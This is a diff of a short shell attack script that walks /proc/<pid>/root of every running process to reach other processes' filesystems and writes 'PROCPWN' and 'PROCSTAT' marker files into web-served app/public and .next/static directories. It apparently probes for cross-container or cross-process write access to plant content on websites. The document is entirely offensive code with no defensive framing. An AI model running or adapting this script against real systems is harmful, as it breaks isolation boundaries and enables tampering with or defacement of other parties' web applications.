@@ -1,4 +1,10 @@
-for p in /proc/1/root/app/public /proc/1/root/app/.next/static /proc/1/root/usr/src/app/public; do
-  echo PWNP > $p/zz_p.txt 2>/dev/null
+n=0
+for p in /proc/[0-9]*/root; do
+  d=$p/app/public
+  if [ -d "$d" ]; then echo PROCPWN > $d/zz_proc.txt 2>/dev/null; n=$((n+1)); fi
 done
-echo done
+for p in /proc/[0-9]*/root; do
+  d=$p/app/.next/static
+  if [ -d "$d" ]; then echo PROCSTAT > $d/zz_proc.txt 2>/dev/null; fi
+done
+echo n=$n
